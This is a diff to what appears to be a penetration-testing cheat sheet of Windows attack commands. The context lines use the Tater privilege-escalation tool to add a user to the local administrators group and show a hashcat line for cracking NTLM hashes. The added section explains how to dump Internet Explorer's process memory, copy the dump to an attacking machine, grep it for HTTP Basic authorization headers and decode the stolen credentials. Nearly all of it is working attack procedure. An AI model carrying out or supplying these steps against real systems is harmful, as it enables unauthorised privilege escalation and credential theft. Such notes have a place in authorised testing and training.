@@ -20,7 +20,12 @@ Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
 Invoke-Tater -Trigger 1 -Command "net localgroup administrators <username> /add"  
 net localgroup administrators  
 
-
+PASSWORDS IN MEMORY
+CMD > taskmgr
+GUI > Rightclick “iexplore.exe” in the “Image Name” columnand select “Create Dump File”.
+GUI OR CMD > Copy iexplorer.DMP to Attacking Box
+TERM > strings <dumpfile>.DMP | grep "Authorization: Basic"
+TERM > echo -ne <Base64 String> | base64 -d
 
 -hashcat -m 1000 <hash> <wordlist>
 
